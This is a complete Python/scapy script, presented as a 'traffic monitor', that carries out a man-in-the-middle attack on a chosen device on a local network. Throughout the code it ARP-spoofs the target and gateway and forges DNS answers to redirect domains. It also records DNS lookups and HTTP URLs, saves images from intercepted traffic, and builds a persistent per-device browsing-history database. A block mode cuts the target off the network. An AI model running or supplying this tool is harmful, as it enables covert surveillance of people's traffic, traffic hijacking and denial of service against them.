#!/usr/bin/env python3
"""
Sentinel Traffic Monitor v4.0 — Digital Footprint Engine
=========================================================
Features:
  - ARP spoofing (monitor & block modes)
  - DNS query logging with per-domain stats
  - HTTP URL extraction from unencrypted traffic
  - Image capture from HTTP streams
  - Persistent footprint database (footprint_db.json)
  - Per-device, per-domain tracking: duration, bytes, visits
  - Session-based history
"""

import sys
import os
import time
import threading
import logging
import argparse
import signal
import json

from scapy.all import (
    ARP, DNS, DNSQR, DNSRR, Ether, IP, TCP, UDP, Raw,
    conf, get_if_hwaddr, send, sniff, srp
)

# ── Configuration ──────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

STATS_FILE = "traffic_stats.json"
FOOTPRINT_DB = "footprint_db.json"
IMAGES_DIR = "captured_images"

os.makedirs(IMAGES_DIR, exist_ok=True)


class FootprintDatabase:
    """
    Persistent per-device digital footprint database.
    
    Structure of footprint_db.json:
    {
        "192.168.1.72": {
            "domains": {
                "facebook.com": {
                    "first_seen": 1707900000,
                    "last_seen": 1707900300,
                    "visit_count": 5,
                    "bytes_total": 15000,
                    "category": "social"
                },
                ...
            },
            "sessions": [
                {
                    "start": 1707900000,
                    "end": 1707900600,
                    "domains_visited": ["facebook.com", "google.com"],
                    "total_bytes": 50000
                }
            ],
            "total_bytes": 150000,
            "total_domains": 12,
            "images_captured": 3
        }
    }
    """

    def __init__(self):
        self.lock = threading.Lock()
        self.db = self._load()

    def _load(self):
        if os.path.exists(FOOTPRINT_DB):
            try:
                with open(FOOTPRINT_DB, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {}

    def _save(self):
        try:
            tmp = FOOTPRINT_DB + ".tmp"
            with open(tmp, 'w') as f:
                json.dump(self.db, f, indent=2)
            os.rename(tmp, FOOTPRINT_DB)
        except Exception as e:
            logging.error(f"Failed to save footprint DB: {e}")

    def _ensure_device(self, ip):
        if ip not in self.db:
            self.db[ip] = {
                "domains": {},
                "sessions": [],
                "total_bytes": 0,
                "total_domains": 0,
                "images_captured": 0
            }

    def log_domain(self, target_ip, domain, pkt_bytes=0):
        """Record a domain visit with bytes consumed."""
        with self.lock:
            self._ensure_device(target_ip)
            dev = self.db[target_ip]
            now = time.time()

            if domain in dev["domains"]:
                d = dev["domains"][domain]
                d["last_seen"] = now
                d["visit_count"] += 1
                d["bytes_total"] += pkt_bytes
            else:
                dev["domains"][domain] = {
                    "first_seen": now,
                    "last_seen": now,
                    "visit_count": 1,
                    "bytes_total": pkt_bytes,
                    "urls": []
                }
                dev["total_domains"] = len(dev["domains"])

            dev["total_bytes"] += pkt_bytes
            self._save()

    def log_url(self, target_ip, domain, url):
        """Record a specific URL visited under a domain."""
        with self.lock:
            self._ensure_device(target_ip)
            dev = self.db[target_ip]
            now = time.time()

            if domain not in dev["domains"]:
                dev["domains"][domain] = {
                    "first_seen": now,
                    "last_seen": now,
                    "visit_count": 1,
                    "bytes_total": 0,
                    "urls": []
                }

            urls_list = dev["domains"][domain].get("urls", [])
            urls_list.insert(0, {"url": url, "timestamp": now})
            dev["domains"][domain]["urls"] = urls_list[:50]  # Keep latest 50
            self._save()

    def log_image(self, target_ip, filename):
        """Record an image capture."""
        with self.lock:
            self._ensure_device(target_ip)
            self.db[target_ip]["images_captured"] += 1
            self._save()

    def add_bytes(self, target_ip, byte_count):
        """Add bytes to device total (called on every packet)."""
        with self.lock:
            self._ensure_device(target_ip)
            self.db[target_ip]["total_bytes"] += byte_count
            # Don't save on every packet — too expensive. Stats loop handles it.

    def start_session(self, target_ip):
        """Record session start."""
        with self.lock:
            self._ensure_device(target_ip)
            session = {
                "start": time.time(),
                "end": None,
                "domains_visited": [],
                "total_bytes": 0
            }
            self.db[target_ip]["sessions"].append(session)
            self._save()

    def end_session(self, target_ip):
        """Record session end."""
        with self.lock:
            self._ensure_device(target_ip)
            sessions = self.db[target_ip].get("sessions", [])
            if sessions and sessions[-1]["end"] is None:
                sessions[-1]["end"] = time.time()
                self._save()

    def add_domain_to_session(self, target_ip, domain):
        """Add a domain to the current session's visited list."""
        with self.lock:
            self._ensure_device(target_ip)
            sessions = self.db[target_ip].get("sessions", [])
            if sessions and sessions[-1]["end"] is None:
                visited = sessions[-1]["domains_visited"]
                if domain not in visited:
                    visited.append(domain)

    def save_periodic(self):
        """Called periodically to flush data."""
        with self.lock:
            self._save()

    def get_device(self, target_ip):
        with self.lock:
            return self.db.get(target_ip, {})


# ── Global footprint database ─────────────────────────────────────────────────
footprint_db = FootprintDatabase()


class TrafficMonitor(threading.Thread):
    def __init__(self, target_ip, gateway_ip, spoof_dns_domains=None,
                 interface=None, action="monitor"):
        super().__init__()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.action = action
        self.spoof_dns_domains = spoof_dns_domains or {}
        self.stop_event = threading.Event()
        self.target_mac = None
        self.gateway_mac = None

        self.statistics = {
            "target_ip": target_ip,
            "status": "active",
            "upload_bytes": 0,
            "download_bytes": 0,
            "top_domains": [],
            "recent_sites": [],
            "captured_images": []
        }
        self.lock = threading.Lock()

    # ── MAC Resolution ─────────────────────────────────────────────────────────
    def _get_mac(self, ip):
        try:
            logging.info(f"Resolving MAC for {ip}...")
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=3, verbose=0, iface=self.interface)
            if ans:
                mac = ans[0][1].hwsrc
                logging.info(f"  → {ip} = {mac}")
                return mac
        except Exception as e:
            logging.error(f"MAC resolution error for {ip}: {e}")
        return None

    # ── IP Forwarding ──────────────────────────────────────────────────────────
    def enable_ip_forwarding(self):
        try:
            if sys.platform == "darwin":
                os.system('sysctl -w net.inet.ip.forwarding=1')
            else:
                os.system('sysctl -w net.ipv4.ip_forward=1')
            logging.info("IP Forwarding: ENABLED")
        except Exception as e:
            logging.error(f"IP forwarding error: {e}")

    def disable_ip_forwarding(self):
        try:
            if sys.platform == "darwin":
                os.system('sysctl -w net.inet.ip.forwarding=0')
            else:
                os.system('sysctl -w net.ipv4.ip_forward=0')
            logging.info("IP Forwarding: DISABLED")
        except Exception as e:
            logging.error(f"IP forwarding error: {e}")

    # ── ARP Spoofing ──────────────────────────────────────────────────────────
    def _arp_spoof_loop(self):
        logging.info(f"ARP spoofing loop started (mode: {self.action})...")
        my_mac = get_if_hwaddr(self.interface or conf.iface)

        while not self.stop_event.is_set():
            try:
                # Tell target: "I am the gateway"
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                         hwdst=self.target_mac, hwsrc=my_mac),
                     verbose=0, iface=self.interface)
                # Tell gateway: "I am the target"
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                         hwdst=self.gateway_mac, hwsrc=my_mac),
                     verbose=0, iface=self.interface)
            except Exception as e:
                logging.error(f"ARP spoof error: {e}")
            time.sleep(2)

    def restore_arp(self):
        logging.info("Restoring ARP tables...")
        try:
            if self.target_mac and self.gateway_mac:
                for _ in range(5):
                    send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),
                         verbose=0, iface=self.interface)
                    send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac),
                         verbose=0, iface=self.interface)
                    time.sleep(0.3)
        except Exception as e:
            logging.error(f"ARP restore error: {e}")

    # ── DNS Spoofing ──────────────────────────────────────────────────────────
    def _dns_spoof(self, pkt):
        if DNS in pkt and pkt[DNS].qr == 0 and UDP in pkt:
            try:
                qname = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                spoofed_ip = self.spoof_dns_domains.get(qname)
                if not spoofed_ip and '*' in self.spoof_dns_domains:
                    spoofed_ip = self.spoof_dns_domains['*']

                if spoofed_ip:
                    logging.info(f"DNS SPOOF: {qname} → {spoofed_ip}")
                    spoofed_pkt = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10,
                                     rdata=spoofed_ip))
                    )
                    send(spoofed_pkt, verbose=0, iface=self.interface)
                    return True
            except Exception as e:
                logging.error(f"DNS spoof error: {e}")
        return False

    # ── Stats Persistence ─────────────────────────────────────────────────────
    def _save_stats(self):
        with self.lock:
            try:
                data = self.statistics.copy()
                data['timestamp'] = time.time()
                tmp = STATS_FILE + ".tmp"
                with open(tmp, 'w') as f:
                    json.dump(data, f, indent=2)
                os.rename(tmp, STATS_FILE)
            except Exception as e:
                logging.error(f"Stats save error: {e}")

    def _stats_loop(self):
        """Periodic save of live stats + footprint DB."""
        while not self.stop_event.is_set():
            self._save_stats()
            footprint_db.save_periodic()
            time.sleep(2)

    # ── Packet Handler ────────────────────────────────────────────────────────
    def sniff_packets(self, pkt):
        # 1. DNS Spoofing
        self._dns_spoof(pkt)

        # 2. Byte counting
        pkt_len = len(pkt)
        if IP in pkt:
            with self.lock:
                if pkt[IP].src == self.target_ip:
                    self.statistics["upload_bytes"] += pkt_len
                else:
                    self.statistics["download_bytes"] += pkt_len
            footprint_db.add_bytes(self.target_ip, pkt_len)

        # 3. DNS Query Logging → Footprint
        if DNSQR in pkt and pkt[DNSQR].qtype == 1:
            try:
                domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                if not domain or domain.endswith('.local') or domain.endswith('.arpa'):
                    return

                with self.lock:
                    if domain not in self.statistics["top_domains"]:
                        self.statistics["top_domains"] = (
                            [domain] + self.statistics["top_domains"]
                        )[:20]
                        logging.info(f"🌐 Domain: {domain}")

                    self.statistics["recent_sites"].insert(0, {
                        "domain": domain,
                        "url": None,
                        "timestamp": time.time()
                    })
                    self.statistics["recent_sites"] = \
                        self.statistics["recent_sites"][:100]

                # Footprint: log domain with packet size
                footprint_db.log_domain(self.target_ip, domain, pkt_len)
                footprint_db.add_domain_to_session(self.target_ip, domain)
                self._save_stats()
            except Exception:
                pass

        # 4. HTTP Inspection (unencrypted only)
        if TCP in pkt and pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load

                # Extract HTTP request URLs
                if b'GET ' in payload or b'POST ' in payload:
                    self._parse_http_request(payload, pkt_len)

                # Extract images from response bodies
                if b'\xff\xd8\xff' in payload:
                    self._save_image(payload, 'jpg')
                elif b'\x89PNG' in payload:
                    self._save_image(payload, 'png')
            except Exception:
                pass

    def _parse_http_request(self, payload, pkt_len):
        """Extract URL from HTTP request."""
        try:
            lines = payload.split(b'\r\n')
            first_line = lines[0].decode('utf-8', errors='ignore')
            host_line = next(
                (l for l in lines if b'Host: ' in l), b''
            ).decode('utf-8', errors='ignore')
            host = host_line.replace('Host: ', '').strip()

            if not host:
                return

            parts = first_line.split(' ')
            if len(parts) < 2:
                return
            url_path = parts[1]
            full_url = f"http://{host}{url_path}"

            # Skip static assets
            skip_ext = ('.css', '.js', '.woff', '.woff2', '.ttf', '.svg', '.ico')
            if any(url_path.lower().endswith(ext) for ext in skip_ext):
                return

            logging.info(f"🔗 HTTP: {full_url}")

            # Log to footprint
            footprint_db.log_domain(self.target_ip, host, pkt_len)
            footprint_db.log_url(self.target_ip, host, full_url)

            # Update live stats
            with self.lock:
                self.statistics["recent_sites"].insert(0, {
                    "domain": host,
                    "url": full_url,
                    "timestamp": time.time()
                })
                self.statistics["recent_sites"] = \
                    self.statistics["recent_sites"][:100]
        except Exception:
            pass

    def _save_image(self, payload, ext):
        """Save captured image from HTTP response."""
        filename = f"img_{int(time.time() * 1000)}.{ext}"
        filepath = os.path.join(IMAGES_DIR, filename)

        try:
            with open(filepath, 'wb') as f:
                f.write(payload)

            with self.lock:
                self.statistics["captured_images"].insert(0, {
                    "filename": filename,
                    "timestamp": time.time()
                })
                self.statistics["captured_images"] = \
                    self.statistics["captured_images"][:30]

            footprint_db.log_image(self.target_ip, filename)
            self._save_stats()
            logging.info(f"📸 Captured {ext.upper()}: {filename}")
        except Exception:
            pass

    # ── Main Thread ───────────────────────────────────────────────────────────
    def run(self):
        logging.info(f"═══ Sentinel Monitor v4.0 ═══")
        logging.info(f"Target: {self.target_ip}")
        logging.info(f"Gateway: {self.gateway_ip}")
        logging.info(f"Interface: {self.interface or 'auto'}")
        logging.info(f"Action: {self.action}")

        # Resolve MACs
        self.target_mac = self._get_mac(self.target_ip)
        self.gateway_mac = self._get_mac(self.gateway_ip)

        if not self.target_mac:
            logging.error(f"FATAL: Cannot resolve MAC for target {self.target_ip}")
            logging.error("Is the device online and on the same subnet?")
            return
        if not self.gateway_mac:
            logging.error(f"FATAL: Cannot resolve MAC for gateway {self.gateway_ip}")
            return

        logging.info(f"Target MAC: {self.target_mac}")
        logging.info(f"Gateway MAC: {self.gateway_mac}")

        # IP forwarding
        if self.action == "monitor":
            self.enable_ip_forwarding()
        else:
            self.disable_ip_forwarding()

        # Start session in footprint DB
        footprint_db.start_session(self.target_ip)

        # ARP spoof thread
        arp_thread = threading.Thread(target=self._arp_spoof_loop, daemon=True)
        arp_thread.start()

        # Stats save thread
        stats_thread = threading.Thread(target=self._stats_loop, daemon=True)
        stats_thread.start()

        try:
            if self.action == "monitor":
                logging.info(f"🔍 Sniffing traffic for {self.target_ip}...")
                sniff(
                    prn=self.sniff_packets,
                    store=0,
                    stop_filter=lambda x: self.stop_event.is_set(),
                    iface=self.interface,
                    filter=f"ip host {self.target_ip}"
                )
            else:
                logging.info(f"🚫 Blocking mode — dropping all traffic for {self.target_ip}")
                while not self.stop_event.is_set():
                    time.sleep(1)
        finally:
            self.stop()

    def stop(self):
        if self.stop_event.is_set():
            return
        logging.info("Shutting down...")
        self.stop_event.set()

        # Update live stats
        with self.lock:
            self.statistics["status"] = "stopped"
        self._save_stats()

        # End session
        footprint_db.end_session(self.target_ip)
        footprint_db.save_periodic()

        time.sleep(1)
        self.restore_arp()
        if self.action == "monitor":
            self.disable_ip_forwarding()
        logging.info("✅ Stopped cleanly. ARP restored.")


# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sentinel Traffic Monitor v4.0")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    parser.add_argument("-i", "--interface", help="Network interface")
    parser.add_argument("--action", choices=["monitor", "block"], default="monitor")
    parser.add_argument("--dns", action="append", help="DNS spoof: domain=ip")

    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("Root required. Run with sudo.")
        sys.exit(1)

    dns_map = {}
    if args.dns:
        for item in args.dns:
            parts = item.split('=')
            if len(parts) == 2:
                dns_map[parts[0]] = parts[1]

    monitor = TrafficMonitor(
        args.target, args.gateway,
        spoof_dns_domains=dns_map,
        interface=args.interface,
        action=args.action
    )

    def graceful_shutdown(signum, frame):
        monitor.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, graceful_shutdown)
    signal.signal(signal.SIGTERM, graceful_shutdown)

    monitor.start()

    try:
        while monitor.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        monitor.stop()
